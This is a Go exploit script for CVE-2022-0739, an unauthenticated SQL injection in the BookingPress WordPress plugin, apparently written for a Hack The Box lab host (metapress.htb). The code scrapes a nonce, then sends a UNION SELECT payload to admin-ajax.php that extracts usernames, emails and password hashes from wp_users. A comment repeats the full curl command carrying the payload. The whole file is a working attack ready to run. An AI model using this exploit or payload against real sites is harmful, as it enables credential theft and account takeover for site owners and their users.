// BookingPress < 1.0.11 - Unauthenticated SQL Injection
//
// The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query
// via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users),
// leading to an unauthenticated SQL Injection
//
// CVE-2022-0739
// https://plugins.trac.wordpress.org/changeset/2684789

// Sources:
// https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357
// https://github.com/rapid7/metasploit-framework/blob/d48319a867a75cae501cc6797114b511ba0293a4/modules/auxiliary/gather/wp_bookingpress_category_services_sqli.rb
// https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py

package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"regexp"
)

type User struct {
	Username     string `json:"bookingpress_service_id"`
	Email        string `json:"bookingpress_category_id"`
	PasswordHash string `json:"bookingpress_service_name"`
	ServicePrice string `json:"bookingpress_service_price"`
}

var HOST = "metapress.htb"
var URI = "/events/"

func main() {
	resp := exploit()
	extractData(resp)
}

func extractData(responseBody []byte) {
	// Parse the JSON data
	var users []User
	err := json.Unmarshal(responseBody, &users)
	if err != nil {
		fmt.Println(err)
	}

	// Extract the desired parameters
	for _, user := range users {
		fmt.Printf("Service ID: %s\n", user.Username)
		fmt.Printf("Category ID: %s\n", user.Email)
		fmt.Printf("Service Name: %s\n", user.PasswordHash)
		fmt.Println()
	}
}

func exploit() []byte {

	// Set the request parameters
	action := "bookingpress_front_get_category_services"
	wpNonce := getNonce()
	categoryID := "33"
	totalService := "-7502"
	sqli := ") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -"

	// Create the request body with the specified parameters
	// curl -i 'http://metapress.htb/wp-admin/admin-ajax.php'
	//--data 'action=bookingpress_front_get_category_services&_wpnonce=27bb5d419c&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users-- -'
	requestBody := bytes.NewBufferString(fmt.Sprintf("action=%s&_wpnonce=%s&category_id=%s&total_service=%s%s", action, wpNonce, categoryID, totalService, sqli))

	// Create a new POST request with the URL and request body
	request, err := http.NewRequest("POST", "http://"+HOST+"/wp-admin/admin-ajax.php", requestBody)
	if err != nil {
		fmt.Println(err)
	}

	// Set the content type of the request body
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Send the request
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	// Read the response body
	responseBody, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
	}

	// Print the response body
	//fmt.Println(string(responseBody))

	return responseBody

}

func getNonce() string {
	// Create a new GET request with the URL
	request, err := http.NewRequest("GET", "http://"+HOST+URI, nil)
	if err != nil {
		fmt.Println(err)
	}

	// Send the request
	client := &http.Client{}
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(err)
	}
	defer response.Body.Close()

	// Read the response body
	responseBody, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
	}

	// Extract the value of the `_wpnonce` key from the response body using a regular expression
	re := regexp.MustCompile(`_wpnonce:'(\w+)'\s*};`)
	matches := re.FindStringSubmatch(string(responseBody))
	if len(matches) < 2 {
		fmt.Println("_wpnonce was not found")
	}
	wpNonceValue := matches[1]

	return wpNonceValue
}
